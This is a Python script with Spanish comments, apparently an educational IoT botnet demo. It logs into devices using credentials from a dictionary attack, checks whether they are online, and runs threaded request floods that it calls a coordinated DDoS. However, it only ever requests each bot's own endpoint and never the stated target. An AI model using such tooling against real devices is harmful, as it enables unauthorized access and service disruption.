#!/usr/bin/env python3
"""
BOTNET DEMO - Simulador de Botnet para Ataques Coordinados
Demuestra cómo múltiples dispositivos IoT comprometidos pueden coordinarse
"""

import requests
import json
import time
import threading
from datetime import datetime
from requests.auth import HTTPBasicAuth
from concurrent.futures import ThreadPoolExecutor

class BotnetDemo:
    def __init__(self, compromised_devices_file="compromised_devices.json"):
        self.bots = []
        self.load_bots(compromised_devices_file)
        self.attack_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': None,
            'end_time': None
        }
    
    def load_bots(self, filename):
        """Carga dispositivos comprometidos desde archivo JSON"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    self.bots = data
                elif isinstance(data, dict) and 'compromised_devices' in data:
                    self.bots = data['compromised_devices']
                else:
                    self.bots = []
            
            print(f"[*] Cargados {len(self.bots)} bots desde {filename}")
        except FileNotFoundError:
            print(f"[!] Archivo {filename} no encontrado. Usando bots por defecto.")
            self.bots = self.get_default_bots()
        except Exception as e:
            print(f"[!] Error al cargar bots: {e}")
            self.bots = self.get_default_bots()
    
    def get_default_bots(self):
        """Retorna lista vacía si no hay archivo - los bots deben venir de compromised_devices.json"""
        print("[!] No se encontró archivo de dispositivos comprometidos.")
        print("[*] Ejecuta primero real_dictionary_attack.py para generar compromised_devices.json")
        return []
    
    def check_bot_status(self, bot):
        """Verifica si un bot está en línea y accesible"""
        try:
            url = f"http://{bot['ip']}:{bot.get('port', 80)}/"
            auth = HTTPBasicAuth(bot['username'], bot['password'])
            response = requests.get(url, auth=auth, timeout=2)
            return response.status_code == 200
        except:
            return False
    
    def bot_attack(self, bot, target_url, duration=10):
        """Un bot realiza peticiones a un objetivo"""
        auth = HTTPBasicAuth(bot['username'], bot['password'])
        bot_url = f"http://{bot['ip']}:{bot.get('port', 80)}/"
        
        end_time = time.time() + duration
        requests_sent = 0
        successful = 0
        failed = 0
        
        print(f"[*] Bot {bot['ip']} iniciando ataque contra {target_url}")
        
        while time.time() < end_time:
            try:
                # El bot hace una petición a su propio endpoint (simulando tráfico)
                response = requests.get(bot_url, auth=auth, timeout=1)
                requests_sent += 1
                
                if response.status_code == 200:
                    successful += 1
                    self.attack_stats['successful_requests'] += 1
                else:
                    failed += 1
                    self.attack_stats['failed_requests'] += 1
                
                self.attack_stats['total_requests'] += 1
                
                time.sleep(0.1)  # Pequeña pausa entre peticiones
                
            except Exception as e:
                failed += 1
                self.attack_stats['failed_requests'] += 1
                self.attack_stats['total_requests'] += 1
                time.sleep(0.5)
        
        return {
            'bot_ip': bot['ip'],
            'requests_sent': requests_sent,
            'successful': successful,
            'failed': failed
        }
    
    def coordinated_ddos_attack(self, target_url=None, duration=30):
        """Coordina un ataque DDoS desde todos los bots"""
        # Si no se especifica objetivo, usar el primer bot disponible
        if target_url is None:
            if self.bots:
                target_url = f"http://{self.bots[0]['ip']}/"
            else:
                print("[!] No hay bots disponibles para el ataque")
                return
        
        print(f"\n{'='*60}")
        print("    ATAQUE DDoS COORDINADO - DEMOSTRACIÓN BOTNET")
        print(f"{'='*60}")
        print(f"[*] Objetivo: {target_url}")
        print(f"[*] Duración: {duration} segundos")
        print(f"[*] Bots activos: {len(self.bots)}\n")
        
        # Verificar bots en línea
        print("[*] Verificando estado de bots...")
        online_bots = []
        for bot in self.bots:
            if self.check_bot_status(bot):
                online_bots.append(bot)
                print(f"  [+] Bot {bot['ip']} ({bot.get('device_type', 'Unknown')}) - EN LÍNEA")
            else:
                print(f"  [-] Bot {bot['ip']} - OFFLINE")
        
        if not online_bots:
            print("[!] No hay bots en línea. Abortando ataque.")
            return
        
        print(f"\n[*] Iniciando ataque coordinado con {len(online_bots)} bots...")
        self.attack_stats['start_time'] = datetime.now().isoformat()
        
        # Ejecutar ataques en paralelo desde todos los bots
        results = []
        with ThreadPoolExecutor(max_workers=len(online_bots)) as executor:
            futures = [
                executor.submit(self.bot_attack, bot, target_url, duration)
                for bot in online_bots
            ]
            
            for future in futures:
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    print(f"[!] Error en bot: {e}")
        
        self.attack_stats['end_time'] = datetime.now().isoformat()
        
        # Mostrar resultados
        print(f"\n{'='*60}")
        print("    RESULTADOS DEL ATAQUE")
        print(f"{'='*60}")
        
        total_requests = sum(r['requests_sent'] for r in results)
        total_successful = sum(r['successful'] for r in results)
        total_failed = sum(r['failed'] for r in results)
        
        for result in results:
            print(f"\nBot {result['bot_ip']}:")
            print(f"  Peticiones enviadas: {result['requests_sent']}")
            print(f"  Exitosas: {result['successful']}")
            print(f"  Fallidas: {result['failed']}")
        
        print(f"\n{'='*60}")
        print("ESTADÍSTICAS TOTALES:")
        print(f"  Total de peticiones: {total_requests}")
        print(f"  Exitosas: {total_successful}")
        print(f"  Fallidas: {total_failed}")
        print(f"  Tasa de éxito: {(total_successful/total_requests*100) if total_requests > 0 else 0:.2f}%")
        
        elapsed = datetime.fromisoformat(self.attack_stats['end_time']) - \
                  datetime.fromisoformat(self.attack_stats['start_time'])
        print(f"  Tiempo total: {elapsed.total_seconds():.2f} segundos")
        print(f"  Peticiones/segundo: {total_requests/elapsed.total_seconds() if elapsed.total_seconds() > 0 else 0:.2f}")
        
        return results
    
    def save_stats(self, filename="botnet_stats.json"):
        """Guarda estadísticas del ataque"""
        stats = {
            'attack_date': datetime.now().isoformat(),
            'bots_used': len(self.bots),
            'statistics': self.attack_stats
        }
        
        with open(filename, 'w') as f:
            json.dump(stats, f, indent=2)
        
        print(f"\n[*] Estadísticas guardadas en: {filename}")
    
    def list_bots(self):
        """Lista todos los bots disponibles"""
        print(f"\n{'='*60}")
        print("    BOTS DISPONIBLES EN LA BOTNET")
        print(f"{'='*60}")
        
        if not self.bots:
            print("[!] No hay bots disponibles")
            return
        
        for i, bot in enumerate(self.bots, 1):
            status = "EN LÍNEA" if self.check_bot_status(bot) else "OFFLINE"
            print(f"\n[{i}] Bot {bot['ip']}")
            print(f"    Tipo: {bot.get('device_type', 'Unknown')}")
            print(f"    Usuario: {bot['username']}")
            print(f"    Estado: {status}")

def main():
    print("=" * 60)
    print("    BOTNET DEMO - Simulador de Botnet IoT")
    print("=" * 60)
    
    botnet = BotnetDemo()
    
    # Listar bots
    botnet.list_bots()
    
    # Ejecutar ataque coordinado
    print("\n[*] Iniciando demostración de ataque DDoS coordinado...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    try:
        results = botnet.coordinated_ddos_attack(duration=30)
        botnet.save_stats()
        
        print("\n[+] Demostración de botnet completada")
        print("[!] Esta es una demostración educativa en un entorno controlado")
        
    except KeyboardInterrupt:
        print("\n\n[*] Ataque interrumpido por el usuario")
        botnet.save_stats()

if __name__ == "__main__":
    main()

